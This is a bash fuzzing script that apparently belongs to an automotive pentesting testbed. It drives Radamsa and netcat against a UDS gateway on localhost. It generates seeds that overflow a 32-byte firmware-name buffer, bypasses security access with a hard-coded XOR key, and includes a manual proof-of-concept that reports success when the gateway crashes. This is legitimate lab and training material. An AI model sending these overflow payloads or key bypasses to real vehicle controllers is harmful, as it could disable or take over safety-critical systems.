#!/bin/bash
#
# Example Radamsa Fuzzing Script for UDS Firmware Header
#
# This script demonstrates how to use Radamsa to fuzz the firmware header format
# used by the UDS Gateway's TransferData service (0x36). Radamsa is a mutation-based
# fuzzer that generates malformed inputs by applying various mutation strategies
# to seed files.
#
# Target: UDS Gateway at localhost:9556
# Protocol: UDS over TCP (raw bytes)
# Vulnerability: V12 - Buffer overflow in firmware header name field
#
# Firmware Header Format:
#   [4-byte magic: 0x55444346 "UDCF"]
#   [2-byte version]
#   [2-byte name_len]
#   [name: name_len bytes]
#
# The vulnerability triggers when name_len > 32, causing a stack buffer overflow
# during firmware header parsing in TransferData (block sequence 0x01).
#
# Prerequisites:
#   - Radamsa: https://gitlab.com/akihe/radamsa
#   - netcat (nc) for sending data to UDS Gateway
#   - UDS Gateway must be running on localhost:9556
#
# Installation (Ubuntu/Debian):
#   sudo apt install radamsa netcat-openbsd
#   # Or build from source:
#   # git clone https://gitlab.com/akihe/radamsa
#   # cd radamsa && make && sudo make install
#
# Usage:
#   ./fuzz_firmware_radamsa.sh              # Run with default iterations
#   ./fuzz_firmware_radamsa.sh 100          # Run 100 iterations
#   ./fuzz_firmware_radamsa.sh 0            # Run indefinitely
#
# Author: Automotive Pentesting Testbed
#

set -e

# =============================================================================
# Configuration
# =============================================================================

UDS_HOST="${UDS_HOST:-localhost}"
UDS_PORT="${UDS_PORT:-9556}"
ITERATIONS="${1:-50}"
SEED_DIR="/tmp/fuzz_firmware_seeds"
OUTPUT_DIR="/tmp/fuzz_firmware_output"
CRASH_DIR="/tmp/fuzz_firmware_crashes"

# UDS Constants
UDS_SID_DIAGNOSTIC_SESSION=0x10
UDS_SID_SECURITY_ACCESS=0x27
UDS_SID_REQUEST_DOWNLOAD=0x34
UDS_SID_TRANSFER_DATA=0x36

# Session types
UDS_SESSION_PROGRAMMING=0x02

# Firmware header magic (big-endian bytes for "UDCF" -> 0x55444346)
FIRMWARE_MAGIC="\x55\x44\x43\x46"

# =============================================================================
# Helper Functions
# =============================================================================

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $*"
}

log_error() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] ERROR: $*" >&2
}

# Send raw bytes to UDS Gateway and capture response
send_uds() {
    local data="$1"
    local timeout="${2:-2}"

    echo -ne "$data" | timeout "$timeout" nc -q 1 "$UDS_HOST" "$UDS_PORT" 2>/dev/null | xxd -p
}

# Send bytes from a file to UDS Gateway
send_uds_file() {
    local file="$1"
    local timeout="${2:-2}"

    timeout "$timeout" nc -q 1 "$UDS_HOST" "$UDS_PORT" < "$file" 2>/dev/null | xxd -p
}

# Create a valid firmware header (seed for mutation)
create_valid_header() {
    local version="${1:-0x0001}"
    local name="${2:-TestFirmware}"
    local name_len=${#name}

    # Build header bytes
    # Magic: 0x55 0x44 0x43 0x46 (UDCF)
    # Version: 2 bytes big-endian
    # Name length: 2 bytes big-endian
    # Name: variable length

    local version_hi=$(( (version >> 8) & 0xFF ))
    local version_lo=$(( version & 0xFF ))
    local len_hi=$(( (name_len >> 8) & 0xFF ))
    local len_lo=$(( name_len & 0xFF ))

    printf '\x55\x44\x43\x46'
    printf "\\x%02x\\x%02x" "$version_hi" "$version_lo"
    printf "\\x%02x\\x%02x" "$len_hi" "$len_lo"
    printf '%s' "$name"
}

# Create UDS TransferData request with firmware header as first block
create_transfer_data_request() {
    local header_file="$1"
    local block_seq="${2:-01}"

    # TransferData: [0x36] [block_seq] [data...]
    printf '\x36'
    printf "\\x$block_seq"
    cat "$header_file"
}

# Setup UDS session for firmware transfer
setup_transfer_session() {
    log "Setting up Programming Session and Security Access..."

    # Request Programming Session (0x10 0x02)
    local resp
    resp=$(send_uds "\x10\x02" 2)
    if [[ "$resp" != 50* ]]; then
        log_error "Failed to enter Programming Session (got: $resp)"
        return 1
    fi
    log "  Programming Session: OK (response: $resp)"

    # Request Security Seed (0x27 0x01)
    resp=$(send_uds "\x27\x01" 2)
    if [[ "$resp" != 67* ]]; then
        log_error "Failed to get security seed (got: $resp)"
        return 1
    fi
    log "  Security Seed received: $resp"

    # Extract seed from response (bytes 2-5)
    # Response format: 67 01 [seed 4 bytes]
    local seed_hex="${resp:4:8}"
    local seed=$((16#$seed_hex))

    # Calculate key: key = seed XOR 0xCAFEBABE
    local key=$((seed ^ 0xCAFEBABE))
    local key_hex
    key_hex=$(printf '%08x' "$key")

    # Send key (0x27 0x02 [key 4 bytes])
    local key_bytes
    key_bytes=$(echo "$key_hex" | sed 's/../\\x&/g')
    resp=$(send_uds "\x27\x02$key_bytes" 2)
    if [[ "$resp" != 6702* ]]; then
        log_error "Security Access failed (got: $resp)"
        return 1
    fi
    log "  Security Access: OK"

    # Request Download (0x34 [format] [addr_len_format] [addr] [size])
    # Simple format: dataFormatId=0x00, addrLenFormatId=0x22 (2-byte addr, 2-byte size)
    # Address=0x0000, Size=0x1000
    resp=$(send_uds "\x34\x00\x22\x00\x00\x10\x00" 2)
    if [[ "$resp" != 74* ]]; then
        log_error "Request Download failed (got: $resp)"
        return 1
    fi
    log "  Request Download: OK"

    return 0
}

# Check if UDS Gateway is responding
check_gateway() {
    log "Checking UDS Gateway at $UDS_HOST:$UDS_PORT..."
    local resp
    resp=$(send_uds "\x10\x01" 2)
    if [[ -z "$resp" ]]; then
        log_error "UDS Gateway not responding"
        return 1
    fi
    log "  Gateway responding: $resp"
    return 0
}

# =============================================================================
# Seed File Generation
# =============================================================================

create_seed_files() {
    log "Creating seed files in $SEED_DIR..."
    mkdir -p "$SEED_DIR"

    # Seed 1: Valid minimal header (name_len = 12)
    create_valid_header 0x0001 "TestFirmware" > "$SEED_DIR/seed_valid.bin"
    log "  Created seed_valid.bin (12-byte name)"

    # Seed 2: Header with 32-byte name (boundary)
    create_valid_header 0x0001 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > "$SEED_DIR/seed_boundary.bin"
    log "  Created seed_boundary.bin (32-byte name, boundary)"

    # Seed 3: Header with 33-byte name (triggers overflow)
    create_valid_header 0x0001 "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > "$SEED_DIR/seed_overflow_33.bin"
    log "  Created seed_overflow_33.bin (33-byte name, triggers V12)"

    # Seed 4: Header with large name_len (100 bytes)
    {
        printf '\x55\x44\x43\x46'  # Magic
        printf '\x00\x01'          # Version
        printf '\x00\x64'          # name_len = 100
        head -c 100 /dev/zero | tr '\0' 'A'  # 100 'A' characters
    } > "$SEED_DIR/seed_overflow_100.bin"
    log "  Created seed_overflow_100.bin (100-byte name, large overflow)"

    # Seed 5: Header with maximum name_len (65535)
    {
        printf '\x55\x44\x43\x46'  # Magic
        printf '\x00\x01'          # Version
        printf '\xFF\xFF'          # name_len = 65535
        head -c 256 /dev/zero | tr '\0' 'A'  # Truncated name data
    } > "$SEED_DIR/seed_overflow_max.bin"
    log "  Created seed_overflow_max.bin (max name_len field)"

    # Seed 6: Invalid magic (for fuzzing detection of magic validation)
    {
        printf '\xDE\xAD\xBE\xEF'  # Invalid magic
        printf '\x00\x01'          # Version
        printf '\x00\x08'          # name_len = 8
        printf 'TestName'
    } > "$SEED_DIR/seed_bad_magic.bin"
    log "  Created seed_bad_magic.bin (invalid magic)"
}

# =============================================================================
# Fuzzing Functions
# =============================================================================

fuzz_single() {
    local iteration="$1"
    local seed_file="$2"
    local mutated_file="$OUTPUT_DIR/mutated_${iteration}.bin"

    # Generate mutated firmware header using Radamsa
    radamsa "$seed_file" > "$mutated_file" 2>/dev/null

    # Create full TransferData request
    local request_file="$OUTPUT_DIR/request_${iteration}.bin"
    create_transfer_data_request "$mutated_file" "01" > "$request_file"

    # Send the mutated request
    local resp
    resp=$(send_uds_file "$request_file" 2) || true

    # Check for crash indicators
    local crashed=0

    # No response might indicate crash
    if [[ -z "$resp" ]]; then
        crashed=1
        log "  [CRASH?] No response (iteration $iteration)"
    fi

    # Check if gateway still responds after this request
    if ! send_uds "\x10\x01" 1 >/dev/null 2>&1; then
        crashed=1
        log "  [CRASH!] Gateway stopped responding (iteration $iteration)"
    fi

    # Save crash-inducing input
    if [[ $crashed -eq 1 ]]; then
        mkdir -p "$CRASH_DIR"
        cp "$mutated_file" "$CRASH_DIR/crash_${iteration}_header.bin"
        cp "$request_file" "$CRASH_DIR/crash_${iteration}_request.bin"
        log "  Saved crash input to $CRASH_DIR"
    fi

    # Cleanup temporary files (keep crashes)
    rm -f "$mutated_file" "$request_file"

    return $crashed
}

fuzz_with_session() {
    local iteration="$1"
    local seed_file="$2"
    local mutated_file="$OUTPUT_DIR/mutated_${iteration}.bin"

    # Setup session first
    if ! setup_transfer_session; then
        log "  Session setup failed, skipping iteration $iteration"
        return 0
    fi

    # Generate mutated firmware header
    radamsa "$seed_file" > "$mutated_file" 2>/dev/null

    # Send TransferData with mutated header (block sequence 0x01)
    local request_data
    request_data=$(printf '\x36\x01'; cat "$mutated_file")

    local resp
    resp=$(echo -ne "$request_data" | timeout 2 nc -q 1 "$UDS_HOST" "$UDS_PORT" 2>/dev/null | xxd -p) || true

    # Check response
    if [[ -z "$resp" ]] || ! send_uds "\x10\x01" 1 >/dev/null 2>&1; then
        log "  [CRASH!] Gateway crashed (iteration $iteration)"
        mkdir -p "$CRASH_DIR"
        cp "$mutated_file" "$CRASH_DIR/crash_${iteration}.bin"
        return 1
    fi

    rm -f "$mutated_file"
    return 0
}

# =============================================================================
# Main Fuzzing Loop
# =============================================================================

main() {
    log "=========================================="
    log "UDS Firmware Header Fuzzer (Radamsa)"
    log "=========================================="
    log ""
    log "Target: $UDS_HOST:$UDS_PORT"
    log "Iterations: $ITERATIONS (0 = infinite)"
    log ""

    # Check prerequisites
    if ! command -v radamsa >/dev/null 2>&1; then
        log_error "Radamsa not found. Install with: sudo apt install radamsa"
        exit 1
    fi

    if ! command -v nc >/dev/null 2>&1; then
        log_error "netcat not found. Install with: sudo apt install netcat-openbsd"
        exit 1
    fi

    # Setup directories
    mkdir -p "$OUTPUT_DIR" "$CRASH_DIR"

    # Create seed files
    create_seed_files

    # Check gateway connectivity
    if ! check_gateway; then
        log_error "Cannot connect to UDS Gateway. Is it running?"
        exit 1
    fi

    log ""
    log "Starting fuzzing..."
    log ""

    local seeds=("$SEED_DIR"/seed_*.bin)
    local seed_count=${#seeds[@]}
    local crash_count=0
    local iteration=0

    # Main fuzzing loop
    while [[ "$ITERATIONS" -eq 0 ]] || [[ $iteration -lt "$ITERATIONS" ]]; do
        iteration=$((iteration + 1))

        # Select seed file (round-robin)
        local seed_idx=$(( (iteration - 1) % seed_count ))
        local seed_file="${seeds[$seed_idx]}"

        if [[ $((iteration % 10)) -eq 0 ]]; then
            log "Progress: iteration $iteration, crashes: $crash_count"
        fi

        # Fuzz without session (faster, for header parsing bugs)
        if fuzz_single "$iteration" "$seed_file"; then
            :  # No crash
        else
            crash_count=$((crash_count + 1))
        fi

        # Brief delay to avoid overwhelming the target
        sleep 0.1
    done

    log ""
    log "=========================================="
    log "Fuzzing Complete"
    log "=========================================="
    log "Iterations: $iteration"
    log "Crashes: $crash_count"
    log "Crash inputs saved to: $CRASH_DIR"
    log ""

    # Summary of V12 exploitation
    log "To manually test V12 (firmware header overflow):"
    log ""
    log "  # Create overflow header (name_len=100, exceeds 32-byte buffer)"
    log "  printf '\\x55\\x44\\x43\\x46\\x00\\x01\\x00\\x64' > /tmp/header.bin"
    log "  head -c 100 /dev/zero | tr '\\0' 'A' >> /tmp/header.bin"
    log ""
    log "  # Send as TransferData block 1 (after session setup)"
    log "  printf '\\x36\\x01' | cat - /tmp/header.bin | nc $UDS_HOST $UDS_PORT | xxd"
    log ""
}

# =============================================================================
# Manual Test Commands (for quick testing without full fuzzing)
# =============================================================================

manual_test_v12() {
    log "Manual V12 Exploitation Test"
    log "============================"

    # Check gateway
    if ! check_gateway; then
        exit 1
    fi

    # Create overflow header directly
    local header_file="/tmp/v12_exploit_header.bin"
    {
        printf '\x55\x44\x43\x46'  # Magic: UDCF
        printf '\x00\x01'          # Version: 1
        printf '\x00\x50'          # name_len: 80 (> 32 buffer)
        head -c 80 /dev/zero | tr '\0' 'A'  # 80 bytes of 'A'
    } > "$header_file"

    log "Created exploit header: $header_file"
    log "Header dump:"
    xxd "$header_file"

    log ""
    log "Setting up session for transfer..."

    if ! setup_transfer_session; then
        log_error "Session setup failed"
        return 1
    fi

    log ""
    log "Sending TransferData with overflow header..."

    # Send TransferData (0x36) with block sequence 0x01 and header
    local resp
    resp=$(printf '\x36\x01'; cat "$header_file") | timeout 2 nc -q 1 "$UDS_HOST" "$UDS_PORT" 2>/dev/null | xxd -p

    log "Response: $resp"

    # Check if service crashed
    sleep 0.5
    if ! send_uds "\x10\x01" 1 >/dev/null 2>&1; then
        log "[SUCCESS] V12 triggered - UDS Gateway crashed!"
    else
        log "[INFO] Service still running - overflow may have been detected"
    fi

    rm -f "$header_file"
}

# Run manual test if --manual flag is provided
if [[ "${1:-}" == "--manual" ]]; then
    manual_test_v12
    exit 0
fi

# Run main fuzzing
main
